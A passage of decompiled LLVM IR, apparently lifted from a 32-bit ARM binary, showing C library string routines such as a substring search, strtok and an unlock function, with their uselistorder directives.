  store i32 %storemerge245, i32* %ip.global-to-local, align 4
  %v2_10734 = add i32 %v1_10778.ph213, %v0_1077c22
  %v3_10738 = icmp ult i32 %v2_10734, %v5_10864
  %v2_1073c = add i32 %v4_107b0.ph, %v0_1077c22
  store i32 %v2_1073c, i32* %r3.global-to-local, align 4
  br i1 %v3_10738, label %dec_label_pc_10744, label %dec_label_pc_1078c

dec_label_pc_10744:                               ; preds = %dec_label_pc_10730
  %v1_10744 = load i32, i32* %r5.global-to-local, align 4
  %v2_10744 = add i32 %v1_10744, %v2_1073c
  %v3_10744 = inttoptr i32 %v2_10744 to i8*
  %v4_10744 = load i8, i8* %v3_10744, align 1
  %v2_10748 = add i32 %v1_10744, %v2_10734
  %v3_10748 = inttoptr i32 %v2_10748 to i8*
  %v4_10748 = load i8, i8* %v3_10748, align 1
  %v6_10748 = zext i8 %v4_10748 to i32
  store i32 %v6_10748, i32* %r3.global-to-local, align 4
  %v9_1074c = icmp eq i8 %v4_10744, %v4_10748
  br i1 %v9_1074c, label %dec_label_pc_10774, label %dec_label_pc_10754

dec_label_pc_10754:                               ; preds = %dec_label_pc_10744
  %v3_1074c = icmp ult i8 %v4_10744, %v4_10748
  br i1 %v3_1074c, label %.thread17, label %.thread16

.thread17:                                        ; preds = %dec_label_pc_10754
  %v3_1076420 = sub i32 %v2_10734, %v4_107b0.ph
  br label %bb199

.thread16:                                        ; preds = %dec_label_pc_10754
  %v2_10758 = add i32 %v1_10778.ph213, 1
  store i32 %v1_10778.ph213, i32* %r6.global-to-local, align 4
  br label %bb199

bb199:                                            ; preds = %.thread17, %.thread16
  %v1_1077476 = phi i32 [ %v3_1076420, %.thread17 ], [ 1, %.thread16 ]
  %v0_1076c = phi i32 [ %v2_10734, %.thread17 ], [ %v2_10758, %.thread16 ]
  %v1_1073c62 = phi i32 [ %v4_107b0.ph, %.thread17 ], [ %v1_10778.ph213, %.thread16 ]
  br label %dec_label_pc_10730.outer

dec_label_pc_10774:                               ; preds = %dec_label_pc_10744
  %v9_10774 = icmp eq i32 %v0_1077c22, %v4_1079c.ph
  br i1 %v9_10774, label %bb201, label %bb200

bb200:                                            ; preds = %dec_label_pc_10774
  %v1_1077c = add i32 %v0_1077c22, 1
  br label %dec_label_pc_10730

bb201:                                            ; preds = %dec_label_pc_10774
  br label %dec_label_pc_10730.outer212

dec_label_pc_1078c:                               ; preds = %dec_label_pc_10730
  %v1_10790 = add i32 %v4_107b0.ph, 1
  store i32 %v1_10790, i32* %r3.global-to-local, align 4
  %v1_10794 = add i32 %v3_1078c.ph, 1
  store i32 %v1_10794, i32* %r7.global-to-local, align 4
  %tmp250 = icmp ugt i32 %v1_10790, %v1_10794
  br i1 %tmp250, label %bb202, label %.thread156

.thread156:                                       ; preds = %dec_label_pc_1078c
  %v0_107a8157 = load i32, i32* %r5.global-to-local, align 4
  %v2_107ac159 = add i32 %v0_107a8157, %v1_10708.ph
  br label %bb203

bb202:                                            ; preds = %dec_label_pc_1078c
  store i32 %v4_1079c.ph, i32* %sl.global-to-local, align 4
  store i32 %v1_10790, i32* %r7.global-to-local, align 4
  %v0_107a8147 = load i32, i32* %r5.global-to-local, align 4
  %v2_107ac149 = add i32 %v0_107a8147, %v4_1079c.ph
  br label %bb203

bb203:                                            ; preds = %.thread156, %bb202
  %storemerge210 = phi i32 [ %v2_107ac159, %.thread156 ], [ %v2_107ac149, %bb202 ]
  %stack_var_-1104.2 = phi i32 [ %stack_var_-1104.0.ph, %.thread156 ], [ %v4_107b0.ph, %bb202 ]
  %v1_107a8152.in = phi i32 [ %v0_107a8157, %.thread156 ], [ %v0_107a8147, %bb202 ]
  %v3_107b4150 = phi i32 [ %v1_10794, %.thread156 ], [ %v1_10790, %bb202 ]
  %v1_107a8152 = inttoptr i32 %v1_107a8152.in to i8*
  %v5_107b4 = call i32 @memcmp(i8* %v1_107a8152, i32 %storemerge210, i32 %v3_107b4150)
  %v2_107b8 = icmp eq i32 %v5_107b4, 0
  br i1 %v2_107b8, label %.thread25, label %dec_label_pc_107c8

.thread25:                                        ; preds = %bb203
  %v1_107c0 = load i32, i32* %sl.global-to-local, align 4
  %v3_107c0 = sub i32 %v5_10864, %v1_107c0
  br label %dec_label_pc_107e8

dec_label_pc_107c8:                               ; preds = %bb203
  %v2_107d0 = sub i32 %v5_10864, %stack_var_-1104.2
  %v1_107d4 = add i32 %v2_107d0, -1
  %v3_107d8 = icmp ult i32 %v1_107d4, %stack_var_-1104.2
  br i1 %v3_107d8, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_107c8
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_107c8, %bb204
  %storemerge246 = phi i32 [ %stack_var_-1104.2, %bb204 ], [ %v1_107d4, %dec_label_pc_107c8 ]
  %v0_107e0 = phi i32 [ %stack_var_-1104.2, %bb204 ], [ %v1_107d4, %dec_label_pc_107c8 ]
  store i32 %storemerge246, i32* %r3.global-to-local, align 4
  %v1_107e0 = add i32 %v0_107e0, 1
  store i32 %v1_107e0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %.thread25, %bb205
  %storemerge = phi i32 [ 0, %bb205 ], [ %v3_107c0, %.thread25 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1080c = ptrtoint i32* %stack_var_-40 to i32
  %v0_107f4.pre = load i32, i32* @r4, align 4
  %v1_107f4.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10548 = or i32 %v5_10864, 63
  br label %dec_label_pc_107f0

dec_label_pc_107f0:                               ; preds = %dec_label_pc_10928, %dec_label_pc_1091c, %.thread29, %.thread27, %dec_label_pc_107e8
  %stack_var_-1108.0 = phi i32 [ 0, %dec_label_pc_107e8 ], [ 0, %.thread27 ], [ %v0_10920, %dec_label_pc_1091c ], [ 0, %dec_label_pc_10928 ], [ 0, %.thread29 ]
  %v0_1054c = phi i32 [ %v1_107f4.pre, %dec_label_pc_107e8 ], [ %v1_107f482, %.thread27 ], [ %v1_107f482, %dec_label_pc_1091c ], [ %v1_107f482, %dec_label_pc_10928 ], [ %v1_107f482, %.thread29 ]
  %v0_107f4 = phi i32 [ %v0_107f4.pre, %dec_label_pc_107e8 ], [ %v3_10828, %.thread27 ], [ %v2_1091c, %dec_label_pc_1091c ], [ %v2_10930, %dec_label_pc_10928 ], [ %v2_10868, %.thread29 ]
  %v2_107f4 = sub i32 %v0_1054c, %v0_107f4
  store i32 %v2_107f4, i32* %r3.global-to-local, align 4
  %tmp251 = icmp ugt i32 %v5_10864, %v2_107f4
  br i1 %tmp251, label %dec_label_pc_10548, label %dec_label_pc_10800

dec_label_pc_10800:                               ; preds = %dec_label_pc_10564, %dec_label_pc_107f0, %dec_label_pc_10940
  %v1_10828 = phi i32 [ %v0_10568, %dec_label_pc_10564 ], [ %v0_107f4, %dec_label_pc_107f0 ], [ %v0_10800.pre, %dec_label_pc_10940 ]
  %v1_107f482 = phi i32 [ %v4_10558, %dec_label_pc_10564 ], [ %v0_1054c, %dec_label_pc_107f0 ], [ %v2_10940, %dec_label_pc_10940 ]
  %v1_10800 = add i32 %v1_10828, -1
  %v0_10804 = load i32, i32* %fp.global-to-local, align 4
  %v2_10804 = add i32 %v0_10804, %v1_10800
  %v3_10804 = inttoptr i32 %v2_10804 to i8*
  %v4_10804 = load i8, i8* %v3_10804, align 1
  %div = udiv i8 %v4_10804, 32
  %v3_10808 = zext i8 %div to i32
  %v3_10810 = mul nuw nsw i32 %v3_10808, 4
  %v2_10814 = add i32 %v3_10810, %v2_1080c
  store i32 %v2_10814, i32* %r3.global-to-local, align 4
  %v1_10818 = add i32 %v2_10814, -32
  %v2_10818 = inttoptr i32 %v1_10818 to i32*
  %v3_10818 = load i32, i32* %v2_10818, align 4
  %tmp252 = urem i8 %v4_10804, 32
  %v1_1081c = zext i8 %tmp252 to i32
  %v6_10820 = lshr i32 %v3_10818, %v1_1081c
  %v1_10824 = urem i32 %v6_10820, 2
  %v2_10824 = icmp eq i32 %v1_10824, 0
  br i1 %v2_10824, label %.thread27, label %dec_label_pc_10834

.thread27:                                        ; preds = %dec_label_pc_10800
  %v3_10828 = add i32 %v0_10804, %v1_10828
  store i32 %v3_10828, i32* @r4, align 4
  br label %dec_label_pc_107f0

dec_label_pc_10834:                               ; preds = %dec_label_pc_10800
  %v6_10804 = zext i8 %v4_10804 to i32
  %v3_10838 = mul nuw nsw i32 %v6_10804, 4
  %v2_1083c = add i32 %v3_10838, %v2_1080c
  store i32 %v2_1083c, i32* %r3.global-to-local, align 4
  %v1_10840 = add i32 %v2_1083c, -1056
  %v2_10840 = inttoptr i32 %v1_10840 to i32*
  %v3_10840 = load i32, i32* %v2_10840, align 4
  %v2_10848 = sub i32 %v5_10864, %v3_10840
  store i32 %v2_10848, i32* %r3.global-to-local, align 4
  %v9_10848 = icmp eq i32 %v5_10864, %v3_10840
  br i1 %v9_10848, label %dec_label_pc_10878, label %dec_label_pc_10850

dec_label_pc_10850:                               ; preds = %dec_label_pc_10834
  %v0_10854 = load i32, i32* %sb.global-to-local, align 4
  %v2_10854 = icmp eq i32 %v0_10854, 0
  br i1 %v2_10854, label %.thread29, label %bb206

bb206:                                            ; preds = %dec_label_pc_10850
  %v3_10858 = icmp eq i32 %stack_var_-1108.0, 0
  br i1 %v3_10858, label %.thread29, label %dec_label_pc_10860

dec_label_pc_10860:                               ; preds = %bb206
  %v0_10860 = load i32, i32* %sl.global-to-local, align 4
  %tmp253 = icmp ugt i32 %v0_10860, %v2_10848
  br i1 %tmp253, label %bb207, label %.thread29

bb207:                                            ; preds = %dec_label_pc_10860
  %v6_10864 = sub i32 %v5_10864, %v0_10860
  store i32 %v6_10864, i32* %r3.global-to-local, align 4
  br label %.thread29

.thread29:                                        ; preds = %dec_label_pc_10850, %bb206, %dec_label_pc_10860, %bb207
  %v1_10868 = phi i32 [ %v2_10848, %dec_label_pc_10850 ], [ %v2_10848, %bb206 ], [ %v2_10848, %dec_label_pc_10860 ], [ %v6_10864, %bb207 ]
  %v2_10868 = add i32 %v1_10868, %v1_10828
  store i32 %v2_10868, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_107f0

dec_label_pc_10878:                               ; preds = %dec_label_pc_10834
  %v1_1087c = load i32, i32* %r7.global-to-local, align 4
  %v3_1087c = icmp uge i32 %stack_var_-1108.0, %v1_1087c
  br i1 %v3_1087c, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_10878
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_10878, %bb208
  %v1_1089c = phi i32 [ %stack_var_-1108.0, %dec_label_pc_10878 ], [ %v1_1087c, %bb208 ]
  %v0_10884 = load i32, i32* %r5.global-to-local, align 4
  %v2_10884 = add i32 %v0_10884, %v1_1089c
  %v3_10884 = inttoptr i32 %v2_10884 to i8*
  %v4_10884 = load i8, i8* %v3_10884, align 1
  %v2_10888 = icmp eq i8 %v4_10884, 0
  br i1 %v2_10888, label %dec_label_pc_108c8, label %dec_label_pc_10890

dec_label_pc_10890:                               ; preds = %bb209
  %v2_10890 = add i32 %v1_1089c, %v1_10828
  %v3_10890 = inttoptr i32 %v2_10890 to i8*
  %v4_10890 = load i8, i8* %v3_10890, align 1
  %v6_10890 = zext i8 %v4_10890 to i32
  store i32 %v6_10890, i32* %r3.global-to-local, align 4
  %v9_10894 = icmp eq i8 %v4_10890, %v4_10884
  br i1 %v9_10894, label %dec_label_pc_1089c, label %dec_label_pc_10928

dec_label_pc_1089c:                               ; preds = %dec_label_pc_10890
  store i32 %v2_10890, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_108b8

dec_label_pc_108a8:                               ; preds = %dec_label_pc_108b8
  %v1_108a8 = add i32 %v0_108a8, 1
  %v2_108a8 = inttoptr i32 %v1_108a8 to i8*
  %v3_108a8 = load i8, i8* %v2_108a8, align 1
  %v4_108a8 = zext i8 %v3_108a8 to i32
  store i32 %v4_108a8, i32* %r3.global-to-local, align 4
  store i32 %v1_108a8, i32* %ip.global-to-local, align 4
  %v9_108ac = icmp eq i8 %v3_108b8, %v3_108a8
  br i1 %v9_108ac, label %dec_label_pc_108b8, label %dec_label_pc_10928

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108a8, %dec_label_pc_1089c
  %v0_108a8 = phi i32 [ %v1_108a8, %dec_label_pc_108a8 ], [ %v2_10890, %dec_label_pc_1089c ]
  %v0_108c0 = phi i32 [ %v1_108c0, %dec_label_pc_108a8 ], [ %v1_1089c, %dec_label_pc_1089c ]
  %v0_108b0 = phi i32 [ %v1_108b8, %dec_label_pc_108a8 ], [ %v2_10884, %dec_label_pc_1089c ]
  %v1_108b8 = add i32 %v0_108b0, 1
  %v2_108b8 = inttoptr i32 %v1_108b8 to i8*
  %v3_108b8 = load i8, i8* %v2_108b8, align 1
  %v2_108bc = icmp eq i8 %v3_108b8, 0
  %v1_108c0 = add i32 %v0_108c0, 1
  br i1 %v2_108bc, label %dec_label_pc_108c8, label %dec_label_pc_108a8

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108b8, %bb209
  br i1 %v3_1087c, label %dec_label_pc_10440, label %dec_label_pc_108d4

dec_label_pc_108d4:                               ; preds = %dec_label_pc_108c8
  %v2_108d4 = add i32 %v0_10884, %v1_1087c
  %v1_108d8 = add i32 %v2_108d4, -1
  %v2_108d8 = inttoptr i32 %v1_108d8 to i8*
  %v3_108d8 = load i8, i8* %v2_108d8, align 1
  %v4_108d8 = zext i8 %v3_108d8 to i32
  store i32 %v4_108d8, i32* %r3.global-to-local, align 4
  %v2_108dc = add i32 %v1_1087c, %v1_10800
  %v3_108dc = inttoptr i32 %v2_108dc to i8*
  %v4_108dc = load i8, i8* %v3_108dc, align 1
  %v9_108e0 = icmp eq i8 %v3_108d8, %v4_108dc
  br i1 %v9_108e0, label %dec_label_pc_108f4.preheader, label %dec_label_pc_1091c

dec_label_pc_108f4.preheader:                     ; preds = %dec_label_pc_108d4
  store i32 %v2_108d4, i32* %ip.global-to-local, align 4
  %v3_108e8 = add i32 %v1_1087c, %v1_10828
  br label %dec_label_pc_108f4

dec_label_pc_108f4:                               ; preds = %dec_label_pc_108f4.preheader, %dec_label_pc_10904
  %v0_10914 = phi i32 [ %v3_108e8, %dec_label_pc_108f4.preheader ], [ %v1_10914, %dec_label_pc_10904 ]
  %v0_10910 = phi i32 [ %v2_108d4, %dec_label_pc_108f4.preheader ], [ %v1_10910, %dec_label_pc_10904 ]
  %v0_108f8 = phi i32 [ %v1_1087c, %dec_label_pc_108f4.preheader ], [ %v1_108f8, %dec_label_pc_10904 ]
  %v1_108f8 = add i32 %v0_108f8, -1
  %v3_108fc = icmp ult i32 %stack_var_-1108.0, %v1_108f8
  br i1 %v3_108fc, label %dec_label_pc_10904, label %dec_label_pc_10440

dec_label_pc_10904:                               ; preds = %dec_label_pc_108f4
  %v1_10904 = add i32 %v0_10910, -2
  %v2_10904 = inttoptr i32 %v1_10904 to i8*
  %v3_10904 = load i8, i8* %v2_10904, align 1
  %v1_10908 = add i32 %v0_10914, -2
  %v2_10908 = inttoptr i32 %v1_10908 to i8*
  %v3_10908 = load i8, i8* %v2_10908, align 1
  %v4_10908 = zext i8 %v3_10908 to i32
  store i32 %v4_10908, i32* %r3.global-to-local, align 4
  %v9_1090c = icmp eq i8 %v3_10904, %v3_10908
  %v1_10910 = add i32 %v0_10910, -1
  store i32 %v1_10910, i32* %ip.global-to-local, align 4
  %v1_10914 = add i32 %v0_10914, -1
  br i1 %v9_1090c, label %dec_label_pc_108f4, label %dec_label_pc_1091c

dec_label_pc_1091c:                               ; preds = %dec_label_pc_10904, %dec_label_pc_108d4
  %v1_1091c = load i32, i32* %sl.global-to-local, align 4
  %v2_1091c = add i32 %v1_1091c, %v1_10828
  store i32 %v2_1091c, i32* @r4, align 4
  %v0_10920 = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_107f0

dec_label_pc_10928:                               ; preds = %dec_label_pc_108a8, %dec_label_pc_10890
  %v1_1092c = phi i32 [ %v1_1089c, %dec_label_pc_10890 ], [ %v1_108c0, %dec_label_pc_108a8 ]
  %v2_1092c = sub i32 %v1_1092c, %stack_var_-1104.2
  store i32 %v2_1092c, i32* %r3.global-to-local, align 4
  %v2_10930 = add i32 %v2_1092c, %v1_10828
  store i32 %v2_10930, i32* @r4, align 4
  br label %dec_label_pc_107f0

dec_label_pc_10940:                               ; preds = %dec_label_pc_10548
  %v0_10940 = load i32, i32* %r8.global-to-local, align 4
  %v1_10940 = load i32, i32* %r6.global-to-local, align 4
  %v2_10940 = add i32 %v1_10940, %v0_10940
  store i32 %v2_10940, i32* %r8.global-to-local, align 4
  %v0_10800.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10800

; uselistorder directives
  uselistorder i32 %v2_10940, { 1, 0 }
  uselistorder i32 %v2_10930, { 1, 0 }
  uselistorder i32 %v2_1091c, { 1, 0 }
  uselistorder i32 %v1_10910, { 1, 0 }
  uselistorder i32 %v1_108f8, { 1, 0 }
  uselistorder i8 %v3_108b8, { 1, 0 }
  uselistorder i32 %v1_108b8, { 1, 0 }
  uselistorder i32 %v1_1089c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1087c, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_10868, { 1, 0 }
  uselistorder i32 %v0_10860, { 1, 0 }
  uselistorder i32 %v2_10848, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_10840, { 1, 0 }
  uselistorder i32 %v3_10828, { 1, 0 }
  uselistorder i8 %v4_10804, { 2, 0, 1 }
  uselistorder i32 %v1_107f482, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10828, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32 %v0_1054c, { 2, 1, 0 }
  uselistorder i32 %stack_var_-1108.0, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10548, { 1, 0 }
  uselistorder i32 %stack_var_-1104.2, { 4, 0, 1, 3, 2 }
  uselistorder i32 %v0_107a8147, { 1, 0 }
  uselistorder i32 %v0_107a8157, { 1, 0 }
  uselistorder i32 %v1_10794, { 1, 0, 2 }
  uselistorder i32 %v1_10790, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1076c, { 1, 0 }
  uselistorder i8 %v4_10748, { 1, 0, 2 }
  uselistorder i8 %v4_10744, { 1, 0 }
  uselistorder i32 %v2_10734, { 3, 2, 4, 5, 0, 1 }
  uselistorder i32 %v0_1077c22, { 2, 3, 0, 1 }
  uselistorder i32 %v1_10778.ph213, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v4_107b0.ph, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_1079c.ph, { 1, 0, 2 }
  uselistorder i32 %v0_10700120126133, { 1, 0 }
  uselistorder i8 %v4_106d8, { 1, 0, 2 }
  uselistorder i8 %v4_106d4, { 1, 0 }
  uselistorder i32 %v2_106c8, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v0_1071010, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1070c.ph215, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_1078c.ph, { 0, 2, 3, 1 }
  uselistorder i32 %v5_10864, { 2, 7, 8, 1, 3, 6, 4, 9, 5, 0 }
  uselistorder i32 %v3_10688, { 1, 0 }
  uselistorder i32 %v1_1067c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10688, { 0, 2, 1 }
  uselistorder i1 %v2_105d4, { 1, 0 }
  uselistorder i32 %v5_105d0, { 1, 2, 0 }
  uselistorder i32 %v1_105cc, { 0, 2, 1 }
  uselistorder i32 %v3_105a0, { 3, 1, 2, 4, 0, 5 }
  uselistorder i32 %v1_10588, { 1, 0, 2 }
  uselistorder i32 %v4_10558, { 0, 2, 1, 3 }
  uselistorder i1 %v2_10524, { 1, 0 }
  uselistorder i32 %v1_10518, { 0, 2, 1 }
  uselistorder i32 %v1_104d4, { 1, 0, 2 }
  uselistorder i1 %v2_104b0, { 1, 0 }
  uselistorder i32 %v3_104ac, { 1, 0, 2 }
  uselistorder i32 %v1_104a0, { 0, 2, 1 }
  uselistorder i32 %v1_1046c, { 1, 0, 2 }
  uselistorder i32 %v0_10460, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder i32 %v2_10454, { 4, 6, 5, 3, 7, 2, 8, 1, 9, 10, 11, 0 }
  uselistorder i8 %v3_10428, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 4, 5, 0, 6, 1, 7, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 5, 2, 3, 4, 0, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 0, 14, 15, 16, 17, 18, 19, 21, 22, 23, 20, 24, 25, 26, 27, 28, 11, 29, 30, 31, 32, 33 }
  uselistorder i32* %ip.global-to-local, { 4, 5, 6, 7, 2, 3, 9, 8, 10, 11, 12, 1, 0, 13 }
  uselistorder i32* %fp.global-to-local, { 3, 0, 2, 1, 4 }
  uselistorder i32 (i8*, i32, i32)* @memcmp, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_108f4, { 1, 0 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %.thread29, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10800, { 2, 1, 0 }
  uselistorder label %dec_label_pc_107e8, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb199, { 1, 0 }
  uselistorder label %dec_label_pc_10730, { 1, 0 }
  uselistorder label %dec_label_pc_10730.outer212, { 1, 0 }
  uselistorder label %bb196, { 1, 0 }
  uselistorder label %dec_label_pc_106bc, { 1, 0 }
  uselistorder label %dec_label_pc_106bc.outer214, { 1, 0 }
  uselistorder label %dec_label_pc_105e8, { 1, 0 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %dec_label_pc_105cc, { 1, 0 }
  uselistorder label %dec_label_pc_10578, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_10538, { 1, 0 }
  uselistorder label %bb188, { 1, 0 }
  uselistorder label %dec_label_pc_10518, { 1, 0 }
  uselistorder label %dec_label_pc_104c4, { 1, 0 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %dec_label_pc_104a0, { 1, 0 }
  uselistorder label %dec_label_pc_10440, { 0, 1, 6, 3, 7, 8, 9, 10, 4, 5, 2 }
}

define i32 @strtok(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10948 = load i32, i32* @r4, align 4
  store i32 %v3_10948, i32* %stack_var_-16, align 4
  %v6_10948 = load i32, i32* @r5, align 4
  %v9_10948 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1094c = icmp eq i32 %arg1, 0
  store i1 %v2_1094c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23d2c.575 to i32), i32* @r6, align 4
  br i1 %v2_1094c, label %dec_label_pc_109bc, label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %entry, %dec_label_pc_109bc
  %v0_1095c = phi i32 [ %v2_109c0, %dec_label_pc_109bc ], [ %arg1, %entry ]
  %v1_10960 = inttoptr i32 %v0_1095c to i8*
  %v2_10960 = call i32 @strspn(i8* %v1_10960)
  %v0_10964 = load i32, i32* @r4, align 4
  %v2_10964 = add i32 %v0_10964, %v2_10960
  store i32 %v2_10964, i32* @r4, align 4
  %v1_10968 = inttoptr i32 %v2_10964 to i8*
  %v2_10968 = load i8, i8* %v1_10968, align 1
  %v3_10968 = zext i8 %v2_10968 to i32
  store i32 %v3_10968, i32* %r3.global-to-local, align 4
  %v2_1096c = icmp eq i8 %v2_10968, 0
  store i1 %v2_1096c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1096c, label %.thread1, label %dec_label_pc_1097c

.thread1:                                         ; preds = %dec_label_pc_1095c
  store i32 %v3_10968, i32* @r4, align 4
  %v2_10974 = load i32, i32* @r6, align 4
  %v3_10974 = inttoptr i32 %v2_10974 to i32*
  store i32 %v3_10968, i32* %v3_10974, align 4
  br label %dec_label_pc_109cc

dec_label_pc_1097c:                               ; preds = %dec_label_pc_1095c
  %v0_1097c = load i32, i32* @r5, align 4
  store i32 %v0_1097c, i32* %r1.global-to-local, align 4
  %v3_10984 = call i32 @strcspn(i8* %v1_10968, i32 %v0_1097c)
  %v1_10988 = load i32, i32* @r4, align 4
  %v2_10988 = add i32 %v1_10988, %v3_10984
  store i32 %v2_10988, i32* %r2.global-to-local, align 4
  %v1_1098c = load i32, i32* @r6, align 4
  %v2_1098c = inttoptr i32 %v1_1098c to i32*
  store i32 %v2_10988, i32* %v2_1098c, align 4
  %v1_10990 = load i32, i32* @r4, align 4
  %v2_10990 = add i32 %v1_10990, %v3_10984
  %v3_10990 = inttoptr i32 %v2_10990 to i8*
  %v4_10990 = load i8, i8* %v3_10990, align 1
  %v6_10990 = zext i8 %v4_10990 to i32
  store i32 %v6_10990, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23d2c.575 to i32), i32* %r1.global-to-local, align 4
  %v2_10998 = icmp eq i8 %v4_10990, 0
  store i1 %v2_10998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10998, label %.thread5, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1097c
  %v1_1099c = load i32, i32* %r2.global-to-local, align 4
  %v2_1099c = add i32 %v1_1099c, 1
  store i32 %v2_1099c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v3_10990, align 1
  %v0_109a8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_109a8.pr.pr, label %.thread4..thread5_crit_edge, label %.thread6

.thread4..thread5_crit_edge:                      ; preds = %.thread4
  %v1_109a8.pre = load i32, i32* %r3.global-to-local, align 4
  %v2_109a8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4..thread5_crit_edge, %dec_label_pc_1097c
  %v2_109a8 = phi i32 [ %v2_109a8.pre, %.thread4..thread5_crit_edge ], [ ptrtoint (i32* @global_var_23d2c.575 to i32), %dec_label_pc_1097c ]
  %v1_109a8 = phi i32 [ %v1_109a8.pre, %.thread4..thread5_crit_edge ], [ %v6_10990, %dec_label_pc_1097c ]
  %v3_109a8 = inttoptr i32 %v2_109a8 to i32*
  store i32 %v1_109a8, i32* %v3_109a8, align 4
  br label %dec_label_pc_109cc

.thread6:                                         ; preds = %.thread4
  %v1_109ac = load i32, i32* %r2.global-to-local, align 4
  %v2_109ac = load i32, i32* %r1.global-to-local, align 4
  %v3_109ac = inttoptr i32 %v2_109ac to i32*
  store i32 %v1_109ac, i32* %v3_109ac, align 4
  br label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %.thread1, %.thread5, %dec_label_pc_109bc, %.thread6
  %v0_109b0 = load i32, i32* @r4, align 4
  %v2_109b4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_109b4, i32* @r4, align 4
  store i32 %v6_10948, i32* @r5, align 4
  store i32 %v9_10948, i32* @r6, align 4
  ret i32 %v0_109b0

dec_label_pc_109bc:                               ; preds = %entry
  %v2_109c0 = load i32, i32* @global_var_23d2c.575, align 4
  store i32 %v2_109c0, i32* @r4, align 4
  %v2_109c4 = icmp eq i32 %v2_109c0, 0
  store i1 %v2_109c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109c4, label %dec_label_pc_109cc, label %dec_label_pc_1095c

; uselistorder directives
  uselistorder i32 %v2_109c0, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23d2c.575 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_109cc, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_1095c, { 1, 0 }
}

define i32 @___syscall3.6(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @__unlock(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_109f4 = load i32, i32* @r0, align 4
  %v1_109f4 = inttoptr i32 %v0_109f4 to i32*
  %v2_109f4 = load i32, i32* %v1_109f4, align 4
  %v2_109f8 = icmp eq i32 %v2_109f4, 0
  store i1 %v2_109f8, i1* @cpsr_z, align 1
  %v3_109fc = load i32, i32* @r4, align 4
  store i32 %v3_109fc, i32* %stack_var_-8, align 4
  store i32 %v0_109f4, i32* @r4, align 4
  br i1 %v2_109f8, label %dec_label_pc_10a58, label %dec_label_pc_10a08

